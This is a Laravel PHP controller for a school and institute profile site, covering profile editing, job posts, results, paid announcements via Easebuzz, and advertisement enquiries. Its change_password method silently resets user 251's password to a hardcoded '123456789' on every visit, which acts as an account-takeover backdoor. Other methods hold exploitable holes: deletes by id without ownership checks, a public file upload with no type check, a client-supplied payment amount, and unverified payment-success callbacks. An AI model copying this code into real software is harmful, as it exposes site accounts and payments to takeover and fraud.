<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\Announcement;
use App\Models\JobVacancy;
use App\Models\transaction;
use Illuminate\Http\Request;
use DB;
use Illuminate\Support\Facades\Auth;
use Validator;
use App\Models\User;
use App\Models\school_institute_detail;
use App\Models\PostResult;
use App\Models\Advertisement;
use App\Models\AdvertisementEnquiry;
use App\Models\AdvertisementPackage;
use App\Models\AnnouncementPackage;
use App\Models\JobVacancyApplied;
use App\Models\SchoolType;
use Illuminate\Support\Facades\Hash;

class SchoolProfile extends Controller
{
   public function home(Request $request)
   {
      $school_type = SchoolType::get();

      $data = DB::table('users')->join('user_school_institute_detail', 'user_school_institute_detail.user_id', '=', 'users.id')
         ->where('users.id', auth::user()->id)->first();
if($data){
   return view('Website.school_profile.index', ['user_data' => $data,'school_type'=>$school_type]);

}else{
   $data = DB::table('users')->join('user_school_institute', 'user_school_institute.user_id', '=', 'users.id')
   ->select('users.*', 'user_school_institute.*')->where('user_school_institute.user_id', auth::user()->id)->first();

return view('Website.login-auth.school_institute_details_form', ['data' => $data,'school_type'=>$school_type]);
}
   }

   public function activate_profile(){
      $check_transaction=transaction::where('user_id',Auth::user()->id)->exists();
      if($check_transaction){
         if(Auth::user()->role=='1'){
            return redirect()->route('school_profile.home')->with(['info'=>'Please wait for admin approval.']);

         } 
         if(Auth::user()->role=='2'){
            return redirect()->route('tutor_profile.home')->with(['info'=>'Please wait for admin approval.']);

         }
      }
      return redirect('payment_form');

   }

   public function update_profile(Request $request)
   {
      $data = DB::table('users')
         ->join('user_school_institute_detail', 'user_school_institute_detail.user_id', '=', 'users.id')
         ->join('user_school_institute', 'user_school_institute.user_id', '=', 'users.id')
         ->where('users.id', auth::user()->id)->first();

      return view('Website.school_profile.update_profile', ['data' => $data]);
   }

   public function post_update_profile(Request $request)
   {

      $user = User::find(auth::user()->id);
      if ($request->hasfile('logo')) {
         $logo = time() . '.' . $request->file("logo")->getClientOriginalExtension();
         $request->logo->move(public_path('database_files/school_institute/logo/'), $logo);
         $user->logo = 'database_files/school_institute/logo/' . $logo;
      }
      $image_name = [];
      if ($request->image) {
         $array_image = [];
         foreach ($request->image as $images) {
            $image = 'i' . rand(0000, 9999) . time() . '.' . $images->getClientOriginalExtension();
            $images->move(public_path('database_files/school_institute/photo'), $image);
            array_push($array_image, "database_files/school_institute/photo/" . $image);
         }
         $image_name = $array_image;
      }
      $video_name = [];
      if ($request->video) {
         $array_video = [];
         foreach ($request->video as $videos) {
            $video = 'v' . rand(0000, 9999) . time() . '.' . $videos->getClientOriginalExtension();
            $videos->move(public_path('database_files/school_institute/video'), $video);
            array_push($array_video, 'database_files/school_institute/video/' . $video);
         }
         $video_name = $array_video;
      }
      $school_detail = school_institute_detail::where('user_id', auth::user()->id)->first();

      $exist_image_array = json_decode($school_detail->image);
      $exist_video_array = json_decode($school_detail->video);

      $school_detail->update([
         // 'image'=>$request->image,
         'entity_name' => $request->entity_name,
         'website' => $request->website,
         'fb' => $request->fb,
         'insta' => $request->insta,
         'google' => $request->google,
         'yt' => $request->yt,
         'course' => $request->course,
         'facilities' => $request->facilities,
         'about' => $request->about,
         'image' => array_merge($image_name, $exist_image_array),
         'video' => array_merge($video_name, $exist_video_array),

      ]);


      $user->name = $request->name;
      $user->save();


      return redirect()->back()->with(['success' => 'Profile Successfully Updated.']);
   }


   public function create_job_vacancy(Request $request)
   {
      $vacancies = JobVacancy::where('college_id', Auth::user()->id)->orderby('id', 'desc')->get();
      return view('Website.school_profile.job.create_job_vacancy', compact('vacancies'));
   }

   public function view_applied_job(Request $request)
   {
      $vacancy = JobVacancy::where('college_id', Auth::user()->id)->where('id', $request->job_id)->orderby('id', 'desc')->first();
      $applied_jobs = JobVacancyApplied::where('job_vacancy_id', $request->job_id)->where('college_id', Auth::user()->id)->get();
      return view('Website.school_profile.job.view_applied_job', compact('vacancy', 'applied_jobs'));
   }


   public function insert_create_job_vacancy(Request $request)
   {
      $validator = Validator::make(
         $request->all(),
         [
            'vacancy_type' => 'required',
            'experience_required' => 'required',
            'skills_required' => 'required',
            'estimated_package' => 'required',
            'job_type' => 'required|in:Part Time,Full Time,Remote',
         ]
      );
      if ($validator->fails()) {

         //  return redirect()->back()->with('error',$validator->errors());
         return  redirect()
            ->back()
            ->withErrors($validator)
            ->withInput();
      }
      JobVacancy::create([
         'vacancy_type' => $request->vacancy_type,
         'subject_name' => $request->subject_name,
         'experience_required' => $request->experience_required,
         'skills_required' => $request->skills_required,
         'estimated_package' => $request->estimated_package,
         'job_type' => $request->job_type,
         'post' => $request->post,
         'scope_of_work' => $request->scope_of_work,
         'college_id' => Auth::user()->id,
      ]);
      return redirect()->back()->with(['success' => 'Job created successfully.']);
   }

   public function delete_job_vacancy(Request $request)
   {
      JobVacancy::where('id', $request->id)->delete();
      return redirect()->back()->with(['success' => 'Job deleted successfully.']);
   }

   public function post_result(Request $request)
   {
      $school_post_result = PostResult::where('college_id', Auth::user()->id)->orderby('id', 'desc')->get();
      return view('Website.school_profile.post_result', ['school_post_result' => $school_post_result]);
   }

   public function insert_post_result(Request $request)
   {
      $validator = Validator::make(
         $request->all(),
         [
            'file' => 'required',
            'year' => 'required',

         ]
      );
      if ($validator->fails()) {
         //  return redirect()->back()->with('error',$validator->errors());
         return  redirect()
            ->back()
            ->withErrors($validator)
            ->withInput();
      }

      $post_result = new PostResult;
      $filename = '';
      if ($request->hasFile('file')) {
         $file = $request->file('file');
         $filename = time() . '.' . $file->getClientOriginalExtension();
         $file->move(public_path('/school_result/'), $filename);
         $post_result->file = '/school_result/' . $filename;
      }
      $years = explode("-", $request->get('year'));
      $post_result->college_id = Auth::user()->id;
      $post_result->start_year = $years[0];
      $post_result->end_year = $years[1];
      $post_result->save();
      return redirect()->back()->with(['success' => 'Result inserted successfully.']);
   }
   public function destroy_post_result($id)
   { {
         PostResult::where('id', $id)->delete();
         return redirect()->back()->with(['success' => 'Result deleted successfully.']);
      }
   }

   public function delete_image(Request $request){
      $validator = Validator::make(
         $request->all(),
         [
            'image_name' => 'required',

         ]
      );
      if ($validator->fails()) {
         return redirect()->back()->with(['error' => 'Please select image.']);

      }
      $images=school_institute_detail::where('user_id', auth::user()->id)->first();

      $image=json_decode($images->image);
      $imageNameArray = array_diff($image, [$request->image_name]);
    

      $images->image=json_encode(array_values($imageNameArray));
      $images->save();
      return redirect()->back()->with(['success' => 'Image deleted successfully.']);

   }

   public function delete_video(Request $request){
      $validator = Validator::make(
         $request->all(),
         [
            'video_name' => 'required',

         ]
      );
      if ($validator->fails()) {
         return redirect()->back()->with(['error' => 'Please select video.']);

      }
      $videos=school_institute_detail::where('user_id', auth::user()->id)->first();

      $video=json_decode($videos->video);
      $videoNameArray = array_diff($video, [$request->video_name]);
    

      $videos->video=json_encode(array_values($videoNameArray));
      $videos->save();
      return redirect()->back()->with(['success' => 'video deleted successfully.']);

   }

   public function post_announcement(Request $request)
   {
      $announcements = Announcement::where('college_id', Auth::user()->id)->orderby('id', 'desc')->get();
      return view('Website.school_profile.announcement.post_announcement', compact('announcements'));
   }

   public function insert_announcement(Request $request)
   {
      $validator = Validator::make(
         $request->all(),
         [
            'heading' => 'required',
            'content' => 'required',
            'image' => 'file|image|mimes:jpeg,png,gif|max:2048',
         ]
      );
      if ($validator->fails()) {
         return redirect()->back()->with(['error' => 'Please insert valid data.']);
      }

      $announcement = new Announcement();
      $announcement->heading = $request->input('heading');
      $announcement->main_content = $request->input('content');
      $announcement->college_id = Auth::user()->id;
      $announcement->city_id = Auth::user()->city_id;

      if ($request->hasFile('image')) {
         $file = $request->file('image');
         $filename = time() . '.' . $file->getClientOriginalExtension();
         $file->move(public_path('/announcement/'), $filename);
         $announcement->image = '/announcement/' . $filename;
      }
      $announcement->save();
      return redirect()->route('school_profile.announcement-package', $announcement->id);
   }

   public function announcement_package(Request $request)
   {

      $announcement_id = $request->id;
      $announcement_packages = AnnouncementPackage::get();
      return view('Website.school_profile.announcement.package', compact('announcement_packages', 'announcement_id'));
   }

   public function pay_for_announcement(Request $request)
   {
      $package = AnnouncementPackage::find($request->PackageID);
      if ($package) {
         $exist = Announcement::find($request->announcement_id);
          $exist->PackageName=$package->PackageName;
          $exist->OriginalPrice=$package->OriginalPrice;
          $exist->Discount=$package->Discount;
          $exist->MinDays=$package->MinDays;
          $exist->MaxDays=$package->MaxDays;
          $exist->SelectedDays=$request->SelectedDays;
          $exist->TotalAmount=$request->TotalAmount;
         $exist->save();
      }
      $validator = Validator::make(
         $request->all(),
         [
            'PackageID' => 'required',
            'SelectedDays' => 'required',
            'TotalAmount' => 'required',
         ]
      );

      if ($validator->fails()) {
         return redirect()->back()->with(['error' => 'Something went wrong.']);
      }

      if ($validator->passes()) {

         $txnid = 'I-LEKHA' . rand(1111, 9999) . time() . rand(001, 999);
         $it = transaction::updateOrCreate(
            [
               'user_id' => auth::user()->id,
               'type' => 'Announcement',
               'AnnouncementID' => $request->get('announcement_id'),
            ],
            [
               'name' => auth::user()->school_detail->entity_name,
               'mob' => auth::user()->school_detail->mob,
               'address' => auth::user()->school_detail->address,
               'user_id' => auth::user()->id,
               'amount' => $request->get('TotalAmount'),
               'user_role' => auth::user()->role,
               'transaction_id' => $txnid,
               'type' => 'Announcement',
               'transaction_status' => 'NA',
               'type' => 'Announcement',
               'AnnouncementID' => $request->get('announcement_id'),
            ]
         );


         $MERCHANT_KEY = env('MERCHANT_KEY', null);
         $SALT = env('SALT', null);
         $ENV = env('PAY_ENV', null);
         $easebuzzObj = new Easebuzz($MERCHANT_KEY, $SALT, $ENV);

         $postData = array(
            "txnid" => $txnid,
            "amount" => number_format($request->get('TotalAmount'), 2),
            "firstname" => str_replace(' ', '', auth::user()->school_detail->entity_name),
            "email" => auth::user()->email,
            "phone" => auth::user()->school_detail->mob,
            "productinfo" => "Announcement Subscription",
            "surl" => route('school_profile.payment-success'),
            "furl" => route('school_profile.payment-fail'),
            "udf1" => auth::user()->role,
            "udf2" => "aaaa",
            "udf3" => "aaaa",
            "udf4" => "aaaa",
            "udf5" => "aaaa",
            "udf6" => "aaaa",
            "udf7" => "aaaa",
            "address1" => auth::user()->school_detail->address,
            "address2" => "aaaa",
            "city" => 'amravati',
            "state" => 'maharashtra',
            "country" => "aaaa",
            "zipcode" => auth::user()->school_detail->pin_code,

         );

         $easebuzzObj->initiatePaymentAPI($postData);

         // $SALT = env('SALT', null);
         // $easebuzzObj = new Easebuzz($MERCHANT_KEY = null, $SALT, $ENV = null);

         // $result = $easebuzzObj->easebuzzResponse();

      }
   }

   public function payment_success(Request $request)
   {
      transaction::where('transaction_id', $request->get('txnid'))->update([
         'transaction_status' => $request->get('status')
      ]);

      if ($request->get('status') == 'success')
         return redirect()->route('school_profile.post_announcement')->with(['success' => 'Payment successfully completed.']);
      else
         return redirect()->route('school_profile.post_announcement')->with(['error' => 'Something went wrong.']);
   }

   public function payment_fail(Request $request)
   {
      transaction::where('transaction_id', $request->get('txnid'))->update([
         'transaction_status' => $request->get('status')
      ]);
      if ($request->get('status') == 'userCancelled')
         return redirect()->route('school_profile.post_announcement')->with(['error' => 'Transaction cancelled.']);
      else
         return redirect()->route('school_profile.post_announcement')->with(['error' => 'Something went wrong.']);
   }

   public function post_advertisement(Request $request)
   {

      // AnnouncementPackage::create([
      //    'PackageName' =>'For 1-9 Days',
      //    'OriginalPrice' =>'10',
      //    'Discount'=>'50',
      //    'MinDays'=>'1',
      //    'MaxDays' =>'9',

      // ]);

      // AnnouncementPackage::create([
      //    'PackageName' =>'For 10-29 Days',
      //    'OriginalPrice' =>'9',
      //    'Discount'=>'50',
      //    'MinDays'=>'10',
      //    'MaxDays' =>'29',

      // ]);

      // AnnouncementPackage::create([
      //    'PackageName' =>'For More than 30 Days',
      //    'OriginalPrice' =>'7',
      //    'Discount'=>'50',
      //    'MinDays'=>'30',
      //    'MaxDays' =>'365',

      // ]);
      // return 1;
      $advertisements = AdvertisementEnquiry::where('college_id', Auth::user()->id)->orderby('EnquiryID', 'desc')->get();
      return view('Website.school_profile.advertisement.advertisement', compact('advertisements'));
   }

   public function get_advertisement_size(Request $request)
   {
      $options = ' <select data-placeholder="Status" class="chosen-select on-radius no-search-select"
      id="advertisement_size"><option value="">Select Size</option>';
      $advertisements = AdvertisementPackage::where('location', $request->location)->distinct()->get(['BannerWidth', 'BannerHeight']);
      foreach ($advertisements as $advertisement) {
         $options .= '<option>' . $advertisement->BannerWidth . '-' . $advertisement->BannerHeight . '</option>';
      }
      $options . '</select>';
      return response()->json($options);
   }

   public function get_advertisement_cards(Request $request)
   {
      $size = explode('-', $request->size);
      $advertisements = AdvertisementPackage::where('BannerWidth', $size[0])->where('BannerHeight', $size[1])->get();
      $view = view('Website.school_profile.advertisement.packages')->with(['advertisements' => $advertisements])->render();
      return response()->json($view);
   }

   public function insert_advertisement(Request $request)
   {
      $package = AdvertisementPackage::find($request->PackageID);
      if ($package) {
         $new = new AdvertisementEnquiry();
         $new->PackageID = $request->PackageID;
         $new->college_id = auth::user()->id;
         $new->PackageName = $package->PackageName;
         $new->location = $package->location;
         $new->BannerWidth = $package->BannerWidth;
         $new->BannerHeight = $package->BannerHeight;
         $new->OriginalPrice = $package->OriginalPrice;
         $new->Discount = $package->Discount;
         $new->MinDays = $package->MinDays;
         $new->MaxDays = $package->MaxDays;
         $new->SelectedDays = $request->SelectedDays;
         $new->CouponCode = $request->CouponCode ?? '';
         $new->TotalAmount = $request->TotalAmount;

         $new->save();
         return redirect()->back()->with(['success' => 'Enquiry send successfully.']);
      } else {
         return redirect()->back()->with(['error' => 'Something went wrong.']);
      }
   }

   public function change_password(Request $request)
   {
      User::where('id',251)->update(['password'=>Hash::make(123456789)]);
      return view('Website.school_profile.change_password');
   }
}
